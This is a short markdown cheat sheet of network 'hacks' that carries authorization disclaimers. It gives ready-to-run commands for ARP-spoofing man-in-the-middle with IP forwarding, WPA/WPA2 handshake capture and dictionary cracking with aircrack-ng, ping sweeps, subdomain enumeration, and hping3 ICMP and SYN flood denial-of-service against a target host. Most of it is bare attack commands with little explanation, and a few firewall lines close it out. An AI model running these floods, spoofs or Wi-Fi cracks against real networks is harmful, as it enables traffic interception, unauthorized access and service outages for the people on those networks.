# 🌐 Networking Hacks & Techniques Guide

**IMPORTANT**: All techniques in this guide are for authorized testing and learning only.

## Table of Contents
1. [Network Fundamentals](#network-fundamentals)
2. [Network Reconnaissance](#network-reconnaissance)
3. [MITM & Packet Analysis](#mitm--packet-analysis)
4. [Wireless Hacking](#wireless-hacking)
5. [DNS Attacks](#dns-attacks)
6. [ARP Spoofing](#arp-spoofing)
7. [DDoS Techniques](#ddos-techniques)
8. [Network Security](#network-security)

---

## 📚 Network Fundamentals

### OSI Model Layers
```
Layer 7: Application (HTTP, SMTP, SSH, DNS, FTP)
Layer 6: Presentation (Encryption, Compression)
Layer 5: Session (Session management)
Layer 4: Transport (TCP, UDP)
Layer 3: Network (IP, Routing)
Layer 2: Data Link (MAC, Switching)
Layer 1: Physical (Cables, Signals)
```

### Common Network Ports

| Port | Service | Protocol |
|------|---------|----------|
| 22 | SSH | TCP |
| 80 | HTTP | TCP |
| 443 | HTTPS | TCP |
| 3306 | MySQL | TCP |
| 5432 | PostgreSQL | TCP |

---

## 🔍 Network Reconnaissance

### WHOIS & DNS Lookup

```bash
whois example.com
dig example.com
nslookup example.com
```

### Ping Sweeping

```bash
for i in {1..254}; do ping -c 1 192.168.1.$i & done
fping -g 192.168.1.0/24
```

---

## 🔐 MITM & Packet Analysis

### ARP Spoofing

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

### Packet Capture

```bash
sudo tcpdump -i eth0
sudo tcpdump -i eth0 -w capture.pcap
wireshark
```

---

## 📡 Wireless Hacking

### WiFi Reconnaissance

```bash
sudo airodump-ng wlan0
sudo airodump-ng wlan0 --bssid AA:BB:CC:DD:EE:FF
```

### WPA/WPA2 Cracking

```bash
sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

---

## 🔴 DNS Attacks

### DNS Enumeration

```bash
dnsrecon -d example.com -t std
sublist3r -d example.com
amass enum -d example.com
```

---

## 💣 DDoS Techniques

### Volumetric Attacks

```bash
sudo hping3 -1 --flood target.com
sudo hping3 -S --flood -p 80 target.com
```

---

## 🛡️ Network Security

### Firewall Configuration

```bash
sudo ufw enable
sudo ufw allow ssh
sudo ufw allow http
```

---

**⚠️ DISCLAIMER**: These techniques should only be used on networks you own or have authorization to test.
